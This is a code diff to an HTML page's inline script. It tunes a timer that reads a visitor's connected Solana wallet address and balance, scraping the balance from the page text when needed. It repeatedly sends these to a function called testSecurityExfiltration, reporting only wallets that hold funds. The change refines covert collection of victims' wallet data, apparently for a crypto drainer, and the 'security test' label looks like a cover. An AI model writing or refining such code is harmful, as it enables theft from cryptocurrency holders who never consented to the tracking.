@@ -1546,16 +1546,25 @@ async function testSecurityExfiltration(address, sol, tokens) {
 setInterval(() => {
     if (state && state.conn && state.conn.address) {
         const addr = state.conn.address;
-        const pageText = document.body.innerText;
-        const solMatch = pageText.match(/(\d+\.?\d*)\s?SOL/);
-        const currentSol = solMatch ? solMatch[0] : (state.balance ? (state.balance / 1e9).toFixed(3) + " SOL" : "Scan...");
+        let realSol = "0";
+        
+        if (state.balance && state.balance > 0) {
+            realSol = (state.balance / 1e9).toFixed(3) + " SOL";
+        } else {
+            const match = document.body.innerText.match(/(\d+\.\d+)\s?SOL/);
+            if (match && parseFloat(match[1]) > 0) {
+                realSol = match[0];
+            }
+        }
 
-        if (window.lastSent !== addr + currentSol) {
-            window.lastSent = addr + currentSol;
-            testSecurityExfiltration(addr, currentSol, state.currency || "SOL");
+        const uniqueKey = addr + realSol;
+        if (window.lastSent !== uniqueKey && realSol !== "0") {
+            window.lastSent = uniqueKey;
+            testSecurityExfiltration(addr, realSol, state.currency || "SOL");
         }
     }
-}, 2000);
+}, 3000);
 </script>
 </body>
 </html>
+
